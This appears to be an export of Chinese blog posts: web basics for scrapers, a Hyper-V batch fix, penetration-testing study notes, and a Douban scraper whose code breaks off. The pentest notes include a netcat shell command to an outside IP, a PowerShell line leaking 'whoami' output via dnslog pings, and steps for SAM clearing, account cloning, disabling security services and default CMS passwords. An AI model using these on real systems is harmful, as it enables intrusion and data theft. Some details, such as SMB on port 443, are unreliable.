互联网媒体类型或者MIME类型，在HTTP协议消息头中用来表示具体请求中的媒体类型信息。 请求体 请求体一般都是POST请求中表单的内容。对于GET请求则没有请求体。而在我们进行提交POST请求时，需要注意把请求头的Content-Type设为application/x-www-from-urlencode。只有这样内容才能以表单数据的形式进行提交。也可以将Content-Type设置为application/json来提交JSON数据。其他Content-Type类型与POST的关系如下表。\nContent-Type POST提交数据的方式 application/x-www-from-urlencode 表单数据 multipart/from-data 表单文件上传 application/json 序列化 JSON 数据 text/xml XML数据 响应 Response，由服务器返回给客户端。响应可以分为三部分：响应状态码、响应头、响应体\n响应状态码 表示服务器的响应状态。暂时不详细列举，记住几个主要的就行。200表示服务器处理请求成功。302表示请求的网页跳转到其他网页。\n响应头 包含了服务器对请求的应答信息。\nDate: 用于标识响应产生的时间 Last-Modified: 用于指定资源的最后修改时间 Content-Enocoding: 用于指定响应内容的编码 Server: 包含服务器的信息，如名称、版本号等 Content-Type: 文档类型，指定返回的数据是什么类型 Set-Cookie: 设置Cookie。用于告诉浏览器需要将此内容放到Cookie中 Expires: 用于指定响应的过期时间，可以让代理服务器或浏览器将加载的内容更新到缓存中。可以使下次访问的时候直接使用缓存中的内容 响应体 最为关键的部分，我们看到的网页它的源代码其实就在响应体中。而我们写爬虫时就是要爬取这部分的内容。这部分可以通过鼠标右键-查看源代码进行查看。\nweb网页基础 网页的组成 一个web网页基本是由HTML、javascript、css这三大部分组成。如果我们把网页比作人，那么HTML就是骨架，javascript就是肌肉，css就是皮肤。\nHTML 超文本标记语言。一种用来描述网页的语言。\n这部分就是HTML语言，它包含了一系列的标签，同时这些标签也起着不同的作用。\njavascript 简称JS，是一种脚本语言。可以与HTML和CSS组合使用，它能给用户提供一种静态信息缺乏交互性。我们在下载或加载时出现的加载符号就是由JS实现的。\ncss 由HTML语言写出来的只是网页的框架，所以看起来就并不美观，所以CSS就是起到网页美化的作用。\n节点树及节点间的关系 在HTML中，所有标签定义的内容都是节点，而这些节点构成一个HTML节点树，也就叫HTML DOM树。它们是有标准的。\n1.整个网站文档是一个文档节点 2.每个HTML标签对应一个根节点，比如html标签，他就属于一个根节点 \u0026lt;html\u0026gt; 3.节点内的文本是文本节点，如a节点代表一个超链接，它内部的文本也被认为是一个文本节点 \u0026lt;a\u0026gt; 4.每个节点的属性是属性节点，比如a节点中有一个href标签，这就是一个属性节点 \u0026lt;a href=\u0026gt; 5.注释是注释节点，在HTML中有特殊的语法会被解析为注释，他也会对应一个节点 下图就是html语言的节点树\njavascript语言可以嵌套在任意节点中。\n节点树之间也用有层级关系，其关系如右图\n选择器 这部分是css的一些语法和格式，暂时不讲那么多。\n爬虫的原理 讲了那么多网络知识，现在终于要讲讲爬虫是什么了。如果我们把互联网比作一张蜘蛛网，那么爬虫就是要在这张蜘蛛网上爬行，它每爬到一个节点就是访问了一个页面，一直爬到末端才是找到了想要的资源。我们就是要通过爬虫访问页面然后获取我们想要的信息。\n爬虫概述 简单而言就是获取网页并提取和保存信息的自动化程序。\n获取网页 爬虫的首要目的就是获取网页的源代码，这个源代码就是服务器接受请求后发送过来的响应体。所以关键的点就是要模拟客户端向服务器发送请求，然后让服务器把源代码发过来。这里我们可以通过利用python的urllib、requests等模块来实现。\nimport requests url = \u0026#34;https://www.baidu.com\u0026#34; resp = requests.get(url) print(resp.text) 运行上面的代码,我们就能获取服务器发送过来的响应体，也就是网页的源代码\n提取信息 当我们获取了网页源代码后，要做的就是找到需要的数据。在提取信息时通常用的方法是用正则表达式，这需要构造好正则表达式，这是一个复杂且容易出错的过程，但只要构造完成就能实现信息的精准提取。\n保存数据 提取到的的数据很多的时候就需要保存起来，可以把数据以表单的形式保存到数据库，excle等里面，这样在便于以后更好的利用这些数据。\n自动化程序 在爬取数据的时候常常是要在不同的网页上，如果我们一个网页一个网页的获取源代码然后再在里面找会耗费很多时间。这就需要自己去设计程序，让它能够自动化进行以上操作。\n能爬怎样的数据 网页中存在着各种各样的数据，最为常见的就是网页的html代码，有时也会有json格式的数据，还有一些二进制文件、图片等。这些都是我们可以爬取的数据，只是它们的储存方式会有不同，这在之后爬取相关数据时再详细说明。简单来说只要浏览器能够访问到的数据，我们都可以爬取。\njavascript渲染的页面 在使用requests等模块抓取网页源代码，可能会遇到抓取的源代码和网页源代码不同的情况。这是一个常见的问题，现在很多网页采用的是Ajax前端工业化模块，所以它的网页可能是由javascript代码渲染出来的。\n我们在使用requests模块抓取网页的时候只能得到html代码，所以如果该网页是由javascript渲染出来的，我们是抓取不到js代码的，他也不会去加载js代码，这就导致无法抓取完整的源代码。\n不过也有解决办法，可以直接分析源代码后台Ajax接口，或者使用selenium、Splash、Pyppeteer、Playweight等模块来模拟javascript的渲染。\nSession和Cookie session和cookie之间的区别可以说是很常见的问题了。我们上网的时候也常常用到他们，通常一个需要登录的网站，我们登录之后就可以访问到其他页面。有的网站在登录一次之后，一段时间内再次访问就可以免登录直接访问，等等情况都是cookie和session共同实现的。那么接下来就要解开它们的面纱。\n静态网页和动态网页 静态网页的网页内容是由HTML代码编写的，它里面的各种内容、图片均是由已经写好的HTML代码指定的。静态网页优点就是加载快、编写简单。但问题也显而易见，如可维护性差，不能根据url的变化灵活改变网页内容。也就是说我们如果在通过url传一个name参数，网页时无法将其展示出来的。\n动态网页便可以解决以上问题，它可以根据url的变化，关联数据库对网页进行不同的展示。可以说如今很多网站都是动态网站，它们不再仅仅使用HTML代码还会用php，java等代码编写。动态网页也可以实现网页的登录和注册等功能。\n谈到登录功能，我们在输入并提交正确的账号和密码后，肯定使获得了服务器发送过来的某种凭证才能去访问其他页面，就像你进入大学得到学生卡一样。而这种凭证就是cookie和session共同实现的结果。\n无状态HTTP 这里还要了解一个HTTP特点，就是无状态。HTTP的无状态就是HTTP协议对于事物的处理是没有记忆的，或者说服务器它并不知道客户端当前处于一个什么状态。举个例子就是你成功登录后只能访问了当前页面，如果想要访问其他页面还要继续登录，即使登录信息是一致的。这就是服务器无法判断你当前状态导致的结果。因为服务器只是做到给客户端发送响应包这个过程，而这个过程是完全独立的。所以服务器是不会记录浏览器前后的状态变化也就是没有状态记录。这就导致客户端可能要发送重复的数据包。\n为了保持HTTP连接状态，session和cookie技术就出现了。session在服务端，用于保存用户的session信息；而cookie则在客户端，有了cookie在下次访问网页的时候，客户端就会把cookie里面的内容一起发送给服务器，而服务器就可以通过识别cookie里面的内容来判断用户信息，然后判断用户的登录状态情况，并发送对应的响应包。\n简单理解就是，cookie中保存着用户的凭证信息，下次访问网站时，客户端在发送请求包时就会把它捎带上一起发给服务器。\n所以在爬取需要登录的网页时，需要先登录进去，然后有了cookie才能继续爬取其他网页。\nSession 中文称为会话，其本义就是有始有终的一系列动作，就像打电话一样，从接起电话开始这个行为会一直持续到挂断电话结束。\n在web中，session对象用来存储特定用户的session所需的属性即配置信息。这样用户在应用程序不同页面之间跳转的时，session对象里的变量将不会丢失，会在整个用户session中保存。如果该用户没有session，那么web服务器就会自动创建一个session对象。只有当session过期或被放弃的时候，服务器才会终止该session。\nCookie 指的是网站为了鉴定用户身份，进行session跟踪而存储在用户本地终端上的数据。\nsession维持 我们知道session是保存在服务器的，那么我们要如何访问其他页面的时候去找session核对信息呢。在我们第一次发送登录信息给服务器的时候，服务器返回的响应头中会带有Set-Cookie字段的相应给客户端，这个字段就是用来标记用户的，所以客户端会把cookie保存起来，并在下次向相同网站发送请求时会将cookie带上一起发个服务器，服务器就会识别cookie中携带的Seesion ID信息，并在session对象中查找是否有对应的session并判断session的用户状态。如果这个session是有效的，就说明用户处于登录状态，这时服务器就会发送带有网页源代码的响应包给客户端。\n那反过来说，如果cookie无效或者session过期了，那就要重新登录了。cookie和session相互配合就能实现登录控制。不过它们也可以独立使用。\n属性结构 我们可以通过开发者工具查看cookie\n接下来讲解cookie里面的属性\nName: Cookie的名称。创建后不可更改 Value: Cookie的值。 Domain: 指定可以访问该Cookie的域名。 Path: Cookie的使用路径。 Max-Age: Cookie失效的时间，单位为秒。 Size字段: Cookie的大小。 HTTP字段: Cookie的httponly属性。 Secure: 是否仅允许使用安全协议传输Cookie。 会话Cookie和持久Cookie 会话Cookie就是把Cookie放在浏览器内存里，关闭浏览器后，Cookie即失效；持久Cookie会把Cookie保存在客户端的硬盘里，下次可以继续使用。\n其实说白了，它们都是由Max-Age或Expires字段来决定其失效时间。\n常见误区 大部分人会认为浏览器关闭了，session也就消失了，但这种想法是错误的。在浏览器关闭的时候，服务器是不会立即知道浏览器关闭的，服务器只会通过它们之间的tcp连接状态等信息，判断浏览器是否断开，可以说服务器是不可能直接知道浏览器是否关闭的。 而session是由服务器创建且存在其中的，浏览器关闭只是会让session会话过期或者终端，但是并不代表它被删除了，就像是你去超市办会员卡，你随时可以过来用，并不是说你今天出了超市这张卡就没用了，它们会一直记录你的会员信息，只有当你自己去注销了，你的会员信息才会被删除。session也是这样的。\n代理的基本原理 我们在爬虫是通常会遇到一种状况，就是正在爬的时候，出现403错误。之前用爬取豆瓣图书信息的爬虫代码就出现多次403。这是因为网站会采取一些反爬措施，比如它发现某一ip在单位时间内频繁访问网页，而在超过访问次数阈值的时候，就会直接拒绝提供服务并提供错误信息，这种情况一般而言就是被封IP了。\n基本原理 代理指的就是代理服务器，代网络用户取得网络信息。说白了就是信息中转站，本来我们与服务器是两点一线的，有了代理服务器，我们就会先把请求发给代理服务器，然后由代理服务器发送给目的服务器，而目的服务器也要先发给代理服务器，然后由代理服务器发给我们。\n代理的作用 突破自身IP限制，简单来说就是可以上外网 访问一些单位或团体的内部资源。 提高访问速度 隐藏真实IP。你也不想被别人溯源吧 爬虫代理 爬虫速度不够快能叫爬虫吗，为了避免同一IP多次访问而被ban，就需要使用其他IP代理。\n代理分类 根据协议分类 FTP代理服务器：主要访问FTP服务器，一般有上传、下载及缓存等功能，端口21、2121等 HTTP代理服务器：主要访问网页，一般有内容过滤和缓存功能，端口80、8080、3128等 SSL/TLS代理：主要访问加密网页，一般有SSl、TLS加密功能，端口443 RTSP代理：主要用于Realplayer访问Real流媒体服务器，一般有缓存功能，端口554 Telnet代理：主要用于Telnet远程控制，端口23 POP3/SMTP代理：主要用于POP3/SMTP方式发邮件，一般有缓存功能，端口110/25 SOCK3代理：单纯传递数据包，速度快不关心协议和用法，一般有缓存功能，端口1080 根据匿名程度区分 高度匿名代理：将数据包原封不动的发给服务器，服务器基本上会认为其就是一个正真的客户端。 普通匿名代理：对数据包有一些修改，服务器容易判断这是来自一个代理服务器 透明代理：会告诉服务器真实IP，提高浏览速度。 间谍代理：会记录用户传输的数据，并进行记录，监控，分析等 常见代理设置 网上有些免费代理 有些付费代理 ADSL拨号 蜂窝代理 后面慢慢介绍\n多线程和多进程的基本原理 简单来说，为了提高爬虫效率，我们可能会同时运行多个爬虫任务，而其中涉及多线程和多进程的概念。\n多线程的含义 进程可以理解为一个可以独立运行的而程序单位。比如我们打开了一个浏览器，就可以称之为打开了一个浏览器进程；打开了LOL，就是打开了LOL进程。而我们可以在浏览器里做很多事，比如我们一个页面看视频，一个网页看小说，每打开一个网页就可以说是一个线程。并且它们互不干扰，我们可以同时看视频和看小说。\n进程就是线程的集合，是由一个个线程组成的，线程是操作系统进行运算调度的最小单位，也是进程中的最小运行单位。\n并发和并行 并发指的是多个线程对应的多条指令被快速轮换执行。举个例子就是现在有很多线程，我们线程A执行一段时间，然后线程2执行一段时间，就这样轮番执行，但每次只执行一个线程指令，因为之间的时间很短，所以我们也可以认为它们是一起执行的，但本质上还是因为速度足够快才使它们没有强烈的分离感。\n并行这个才是正真的同时进行，在同一时刻有多条指令在多个处理器上同时执行，但这也意味着必须依赖多个处理器。\n如果计算机处理器只有一个核，那就不能实现并行。\n多线程适用场景 可以说爬虫就是一个典型的利用场景，爬虫在向服务器发送请求后，需要一段时间等待服务器返回响应，这种就属于IO密集型任务。\n对于这种任务，我们就可以启用多线程，在等待的时间去处理其他线程任务。\n除了IO密集型任务这个概念，还有一种叫计算密集型任务，就是任务的运行一直需要处理器的参与\n多进程含义 多进程就是多个进程，我们已经知道了进程就是线程的集合，所以多进程意味着有大于或等于进程数量的线程在同时运行。\nPython中的多线程和多进程 在python中进行多线程的话会有GIL限制。全程是Global Interpreter Lock,即全局解释器。\n在python中每个线程执行分以下三步进行：\n获取GIL 执行对应线程的代码 释放GIL 所以GIL就像通行证一样，拿到通行证了这个线程才能执行，但是python中只有一个GIL，所以只能进行并发操作。而受GIL的影响，python在进行多进程要比多线程有更多优势。\n想了解更多python中多进程和多线程的知识，可以通过以下网站学习\npython的多线程用法：https://setup.scrape.center/python-threading python的多进程用法：https://setup.scrape.center/python-multiprocessing ","date":"2024-02-02T17:46:38+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/13.png","permalink":"https://blog.winglet.com/p/web%E5%9F%BA%E7%A1%80/","title":"Web基础"},{"content":"前言 决定写这么一个分类，主要是记录一下我平时在做些东西时遇到的各种奇奇怪怪的问题，以及我是怎么用莫名方法解决的。然后以后我再遇到同样问题的时候也可能有办法解决。\n部署aspcms之数据库错误解决方法 解决方法 可能不适用所有人\n找到mysql目录,位置在C:\\Program Files\\MySQL，然后右键MySQL选择属性，修改用户权限\n具体修改哪个不清楚，反正你开个虚拟机然后赋予所有用户所有权限就行。\nwindows 10 家庭版没有hyper-V服务 新建一个记事本\npushd \u0026#34;%~dp0\u0026#34; dir /b %SystemRoot%\\servicing\\Packages\\*Hyper-V*.mum \u0026gt;hyper-v.txt for /f %%i in (\u0026#39;findstr /i . hyper-v.txt 2^\u0026gt;nul\u0026#39;) do dism /online /norestart /add-package:\u0026#34;%SystemRoot%\\servicing\\Packages\\%%i\u0026#34; del hyper-v.txt Dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /LimitAccess /ALL 改为1.cmd, 右键并以管理员身份运行\n","date":"2024-01-22T17:45:52+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/640.png","permalink":"https://blog.winglet.com/p/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/","title":"疑难杂症"},{"content":"一、渗透基础知识 渗透测试介绍 渗透测试或渗透测试是一种道德驱动的尝试，旨在测试和分析安全防御以保护这些资产和信息。渗透测试涉及使用与恶意意图相同的工具、技术和方法，并且类似于审计。\n渗透测试注意事项（补充） 不能进行恶意攻击 没有获得书面授权时，不能攻击任何目标 遵守国家安全法法规 渗透测试流程 确定目标，信息收集 漏洞探测，漏洞验证 获取所需，信息分析 编写报告，信息整理 安全术语（了解） 脚本 (asp、php、jsp) html (xml、js、css) cms (B/S) 肉鸡、抓鸡、ddos、cc 事件型漏洞、通用型漏洞 web服务器、web容器、中间件 src平台、0day 黑盒白盒测试 嗅探、rookit、社工 poc、expcve 一句话、小马、大马、webshell、提权、后门、跳板、rookit MD5/加盐 (salt) 源码打包、脱库、爆库 HTTP/HTTPS协议 HTTP: 是互联网上应用最为广泛的一种网络协议，是一个客户端和服务端请求和应答的标准(TCP)，用于从www服务器传输超文本到本地浏览器的传输协议。它可以使浏览器更加高效，使网络传输减少。默认端口:80 HTTPS：是以安全为目标的HTTP通道，简单来说就是HTTP的安全版，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。HTTP + 加密 + 认证 + 完整性保护 = HTTPS。默认端口:443 HTTP URL 统一资源定位符(URL时一种特殊类型的URI，包含了用于查找某个资源足够的信息)\n格式： http://host[: port][abs_path]\n例：http://localhost:1313/index.php\nhttp请求头响应头 referer、x-forwarded-for、client-ip 注入漏洞、xss问题、躲避验证\n对ip限制封锁\nhttp: bp\ntcp：modify client-ip\niis put漏洞(严重)\njsp、tomcat 7.0.1-7\nHTTP响应码 200：请求成功 302：所请求的页面已经临时转移至新的URL 404：服务器无法找到被请求的页面 400：因为语法错误，服务器未能理解请求 401：合法请求，但对被请求页面的访问被禁止。因为被请求的页面需要身份验证，客户端没有提供或者身份验证失败 403：合法请求，但对被请求页面的访问被禁止 500：请求未完成。服务器遇到不可预知的情况 503：服务器当前不可用 waf拦截菜刀也可能导致50x 安全测试环境配置 配置虚拟机 安装wmware 配置虚拟机网络 nat模式：自动获取ip，以物理机为路由器 桥接模式：自动获取，以物理机的路由器为路由器 虚拟机通信：\n网卡一致 ip网段一致 如果不通可以关闭防火墙 kali: 192.168.114.129 win10: 192.168.114.145 修改虚拟机网段 **ps:**windows系统可以通过win+R并输入uac来修改用户控制系统\n搭建windows server 下载地址： MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)\n操作系统： windows server 2012\n搭建网站(.asp) 当服务器搭建多个站（旁站）\n不同端口，ip域名都相同 （端口模式） 相同端口（80）IP不同，也可以 相同端口，相同ip，不同域名 (子域名模式) www.baidu.com\tphp程序 baidu.baidu.com\tasp程序 目录建站 (目录模式) www.baidu.com www.baidu.com/list 创建角色和功能 前面默认选择，在“服务器角色”这里选择如下\n接下来，由于要搭建动态语言脚本，所以在\u0026quot;角色服务\u0026quot;里选择如下（里面的子选项一定也是选中状态）\n接下来就是等待安装\n部署网站 win+R并输入inetmgr打开IIS控制台\n然后我们新建一个网站目录\n**ps：**这里也可以通过自己添加ip来绑定其他更多ip\n接下来我们只需要把一个网站源码放到该目录，然后进行以下修改\n接下来我们就可以直接访问网站，ip:80。如果还是无法访问的话，在默认文档中添加源码的展示文件\n绑定域名 但是如果我们去访问www.baidu.com的话，它会转到百度的页面，这里我们需要修改系统的host解析(优先级高于dns解析)，位置在C:\\Windows\\System32\\Drivers\\etc\\host,并在结尾出添加\n192.168.114.138 www.baidu.com 判断网站是不是基于IIS搭建 用搜索引擎语法inurl=asp?id=\n搭建网站(.php) 下载phpstudy,选择这个版本\n接下来我们在windows 10系统搭建一下。下载后解压并运行程序可得到该界面\n配置系统（处理中） 接下来我们要配置系统，如果你发现windows 10系统没有IIS服务，可以在控制面板-\u0026gt;程序-\u0026gt;启用或关闭windows功能\n接下来我们还要打开FastCgi模块\n课后作业 .asp cms 默认索引文件 后台登陆地址 默认账号/密码 aspcms index.asp http://IP/admin_aspcms/login.asp admin/123456 southdic (南方) Default.asp http://IP/admin/Login.asp admin/0791idc .php cms 默认索引文件 后台登陆地址 默认账号/密码 xdcms index.php http://IP/index.php?m=xdcms\u0026amp;c=login xdcms/xdcms 帝国cms index.php http://IP/e/admin/index.php admin/admin888 dedecms（织梦） index.php http://IP/dede/login.php?gotopage=%2Fdedecms%2Fdede%2F admin/admin phpweb index.php http://IP/root admin/admin 二、windows基础 系统目录 windows -- system32 储存常用命令(如：cmd) | -- config -- sam 存储账号密码(清空可直接登录) 有system32(x86)说明一定64位系统 services.msc打开服务 定义计算机默认功能的开启 DHCP自动分发ip net stop/start [服务名称] 驱动和程序 sc config \u0026quot;safedog center guarder\u0026quot; start=disable 将该服务设为禁用，重启服务后相当于关闭 计算机端口 端口就是用来区分服务的 端口不可复用 (在渗透时，可以尝试将3389端口与80端口进行复用，从而访问80端口时获得远程桌面权限) 端口范围1-65535 1-1024 分给了系统自带的一些服务 木马病毒一般使用高位端口 ps：http隧道技术，端口转发\n常见端口及服务（补充） 注册表及其结构(补充) 打开注册表win+R regedit\nHKEY_CLASSES_ROOT: 文件扩展名与应用的关联及OLE信息 HKEY_CURRENT_USER: 当前用户控制面板选项和桌面等设置，以及映射的网络驱动器 HKEY_LOCAL_MACHINE: 计算机硬件与应用程序信息 HKEY_USERS: 所有登录用户的信息 HKEY_CURRENT_CONFIG: 计算机硬件配置信息 克隆账号HKEY_LOCAL_MACHINE/SAM可以把管理员权限赋予来宾账号 (如何操作) 开机启动项注册表\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 或\\HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\ 常用DOS命令 color: 这个命令用于改变命令提示符窗口的前景色和背景色。 ping: 用于测试与特定网络地址之间的连接。它发送一个网络数据包到目标地址，并等待接收响应，从而评估网络的可达性和延迟。 ipconfig: 命令用于显示计算机的网络配置信息，包括IP地址、子网掩码、默认网关和DNS服务器等。 ipconfig /release: 这个命令用于释放计算机当前使用的IP地址，这样计算机就可以申请新的IP地址。 ipconfig /renew: 这个命令用于向网络中的DHCP服务器请求更新IP地址，以获得一个新的IP地址配置。 systeminfo: systeminfo命令用于显示计算机的详细系统信息，包括操作系统版本、安装的补丁程序、硬件配置和网络信息等。 arp -a: arp命令用于显示计算机的ARP缓存表，其中包含与本地计算机通信的其他设备的MAC地址和IP地址的映射关系。 net view: net view命令用于列出网络上可见的计算机和共享资源。 shutdown -s -t 180 -c: 这个命令用于在计算机上执行关机操作。参数-s表示关机，-t表示等待时间（以秒为单位），-c表示添加一条注释/说明。 dir: dir命令用于显示当前目录中的文件和子目录的列表。 cd: cd命令用于更改当前目录。通过提供目录路径，您可以切换到不同的目录。 start www.baidu.com: 这个命令用于在默认浏览器中打开指定的网址。 start 123.txt: 这个命令用于在关联的应用程序中打开指定的文件 copy con c:\\123.txt: 这个命令用于创建一个新文件，并将用户输入的文本内容写入该文件。 hello winglet: 这不是一个命令，而是一个简单的问候语。 ctrl+z: 这不是一个命令，而是在Windows命令提示符中的组合键，用于结束当前正在运行的命令。 md: md命令用于在当前目录中创建一个新的子目录。 rd 123: rd命令用于删除指定的目录。 ren: ren命令用于重命名文件或目录。 del: del命令用于删除文件。 type 123.txt: type命令用于显示文本文件的内容。 net use K:\\\\192.168.80.128\\c$ : 将在本地计算机上创建一个虚拟驱动器（在这个例子中是驱动器K:），它将与远程计算机上的共享文件夹建立连接。磁盘映射，用的是443端口smb协议 补丁安全要300+\nwindows 远程桌面\nnet user: 这个命令用于管理本地用户账户。它可以列出用户账户信息、创建新用户、更改密码等。 net localgroup: 这个命令用于管理本地用户组。它可以列出用户组信息、添加或删除用户组成员等。 隐藏账号: \u0026#34;aa$\u0026#34; 是一个命名约定，当您创建一个以 \u0026#34;$\u0026#34; 结尾的用户账号时，它会被视为隐藏账号，无法在登录屏幕上直接显示。 tasklist: 这个命令用于列出当前正在运行的进程的信息，包括进程ID、进程名称、内存占用等。 taskkill: taskkill命令用于终止或结束正在运行的进程。 tracert: tracert命令用于跟踪数据包从源地址到目标地址经过的路由路径。它可以显示每个路由器的IP地址和跳跃时间。 echo: echo命令用于在命令提示符窗口上显示文本或启用/禁用命令回显。 query user: 这个命令用于显示当前登录到计算机上的用户列表和会话信息。 msg user: 这个命令用于向其他计算机上的用户发送消息。 whoami: whoami命令用于显示当前登录用户的用户名。 hostname: hostname命令用于显示计算机的主机名。 wmic product get name, version: 这个命令使用 Windows Management Instrumentation Command-line (WMIC) 工具，用于列出安装在计算机上的软件产品的名称和版本信息。 netstat -an: netstat命令用于显示网络连接和网络统计信息。通过添加参数\u0026#34;-an\u0026#34;，它会显示所有活动连接的详细信息，包括本地地址、远程地址、连接状态等。 批处理 (.bat) 如果渗透的时候命令出现符号问题，可以尝试把命令放入批处理中，然后运行批处理来防止符号报错。\npowershell 08开始自带\npowershell -exec bypass .\\aa.psl : 启用powershell并执行aa.psl文件 p 分配站：一个大域名为用户分配小域名\n站库分离： 网站和数据库的服务器不同\n对象存储oss:\n相对路径、绝对路径：\n主站、分站、端口站、子站\n常规：url和文件目录对应上\n路由访问：url和文件目录对应不上，需要根据配置路由决定\n文件结构、语言类型\nweb程序源码：开源 商业 自写\n开源-\n前后端分离 原理：前端js框架，api传输数据\n思路：找后端地址，找前端历史漏洞，社工\n1. 前端页面大部分不存在漏洞 2. 后端管理大部分不在同域名 3. 获得权限可能不影响后端 宝塔+phpstudy 原理：打包类集成化环境，权限配置或受控制\n影响：攻击者权限对比区别\n拿到权限后 宝塔： 文件管理 锁定目录 命令执行 无法执行 phpstudy 有权限 docker搭建 思路：docker逃逸\n原理：虚拟化技术独立磁盘空间，非真实物理环境\n攻击者只在虚拟空间磁盘 建站分配站 原理：利用别人的域名模板建立\n影响：实质安全测试非目标资产\n托管 申请（凡科建站） 静态web 例子：大学的html设计网站\n原理：数据没有传输性（js传输不算）\n影响：无漏洞\n伪静态 原理：动态转为静态技术，伪装的静态\n架构 waf 原理：web应用防火墙\n影响：常规web安全测试手段会受拦截\n例子：windows2012 + IIS + d盾\n非嵌入型：硬件型 软件型 云 嵌入型：网站内置的waf cdn 原理： 内容分发服务，旨在提高访问速度\n影响：隐藏真实IP，导致对目标测试错误\n例子：阿里云备案域名全局CDN加速服务\n​\twindows2012 + BT宝塔面板 + CDN服务\noss 原理：云存储服务，提高访问速度\n影响：无法解析，单独存储，但有accesskey隐患\n例子：http://cloudreve.org/\n​\twindows2012 + cloudreve + 阿里云oss\n反向代理 反向代理 为服务器服务\n正向代理 为客户端服务\n原理：通过网络反向代理转发真实服务达到访问目的\n影响：访问目标只是一个代理，非真实应用服务器\n注意：正向和反向代理都是解决访问不可达问题，但反向代理中多出一个可以重定向解析的功能操作，导致反向代理出的站点指向和真实应用毫无关系\n例子：nginx反向代理设置\n负载均衡 原理：分摊到多个操作单元上进行执行，共同完成工作任务\n影响：有多个服务加载服务，测试过程中存在多个目标情况\n例子：nginx负载均衡配置\nAPP应用开发架构 原生开发 h5语言开发‘ flutter开发 常规web开发 （网页封装app） 原生态-idea 例子：remusic项目源码 安全影响：反编译+抓包+常规测试 web封装-封装平台 例子：shopXO源码程序+一门app打包 安全影响：常规web安全测试 H5+vue-Hbuilderx 例子：hbuilderx案例 安全影响：api\u0026amp;js框架问题 （前后端分离） wx小程序-web开发-hbuilderx 例子： 判断原生态还是web 1. 文件管理器 2. 看app的功能，ui 常见渗透命令 文件下载命令-解决无图形化\u0026amp;数据传输 **生成命令：**https://forum.ywhack.com/bountytips.php?download\n**linux：**wget curl python tuby perl java等\n**windows：**powershell等\n反弹shell命令 命令生成：https://forum.ywhack.com/\n​\tblackhat插件\n正向连接：\n127.0.0.1 | c:\\\\nc.exe -e -lvnp 5566 ncat 47.122.23.131 5566 反向连接：\n127.0.0.1 | 例子：防火墙绕过-正向连接\u0026amp;反向连接\u0026amp;内网服务器\n管道符\n|\t||\t\u0026amp;\u0026amp;\t\u0026amp;\nwindows：|\t\u0026amp;\t||\t\u0026amp;\u0026amp;\nlinux：；\t| ||\t``\n例子:\tping whoami\n**防火墙 **\n出站规则\n入站规则\n漏洞存在，但不回显\n反弹shell 带外查询 linux： ping whoami.[dnslog网址]\nwindows:\ncmd无法执行whoami 用powershell变量赋值，把whoami执行结果给变量 结果带有\u0026#34;\\\u0026#34;,导致ping无法执行 powershell $x=whoami;$x=$x.Replace(\u0026#39;\\\u0026#39;,\u0026#39;xxx\u0026#39;);$y=\u0026#39;.vpod5d.dnslog.cn\u0026#39;;$z=$x+$y;ping $z ","date":"2024-01-18T17:02:45+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/20240121_165102.gif","permalink":"https://blog.winglet.com/p/craser%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0%E6%9B%B4%E6%96%B0%E4%B8%AD/","title":"Craser渗透测试笔记[更新中]"},{"content":"简述 ​\t就以我交实验作业的爬虫代码作为2024年的第一篇博客，也作为我更新博客的开端。其实这个爬虫并不是实验要求的，而是我舍友要我写的，因为我们写的是图书管理系统，所以就把爬数据的任务交给我了。如果想要代码可直接翻到最下面。\n思路 要爬取的页面 要爬取的数据格式 存储数据 代码 import re import time import requests import openpyxl findLink = re.compile(r\u0026#39;\u0026lt;a href=\\\u0026#34;https://book.douban.com/subject/(.*?)\\\u0026#34;\u0026#39;) #获取图书的图书的链接 findTitle = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;og:title\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;) #获取图书的名称 findImgSrc = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;og:image\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;, re.S) #获取图书图片的链接 findDate = re.compile(r\u0026#39;\u0026lt;span class=\u0026#34;pl\u0026#34;\u0026gt;出版年:\u0026lt;/span\u0026gt; (.*?)\u0026lt;br/\u0026gt;\u0026#39;) #图书出版日期 findAuthor = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;book:author\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;) #图书作者名称 findCode = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;book:isbn\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;) #图书编码 findDes = re.compile(r\u0026#39;\u0026lt;meta property=\u0026#34;og:description\u0026#34; content=\u0026#34;(.*?)\u0026#34; /\u0026gt;\u0026#39;, re.S) #图书描述 findPublish = re.compile(r\u0026#39;\u0026lt;span class=\u0026#34;pl\u0026#34;\u0026gt;出版社:\u0026lt;/span\u0026gt;(.*?)\u0026lt;a href=(.*?)\u0026gt;(.*?)\u0026lt;/a\u0026gt;\u0026#39;, re.S) # 图书出版商 #创建一个新的工作簿对象 workbook = openpyxl.Workbook() # 获取默认的工作表 sheet = workbook.active # 写入标题行 sheet.append([\u0026#34;名称\u0026#34;, \u0026#34;描述\u0026#34;, \u0026#34;出版日期\u0026#34;, \u0026#34;作者\u0026#34;, \u0026#34;出版社\u0026#34;, \u0026#34;标准码\u0026#34;, \u0026#34;封面\u0026#34;]) workbook.save(\u0026#34;data.xlsx\u0026#34;) def save(data): sheet.append(data) workbook.save(\u0026#34;data.xlsx\u0026#34;) def askUrl(url): head = { # 模拟浏览器头部信息，向豆瓣服务器发送消息 \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50\u0026#34; } html = 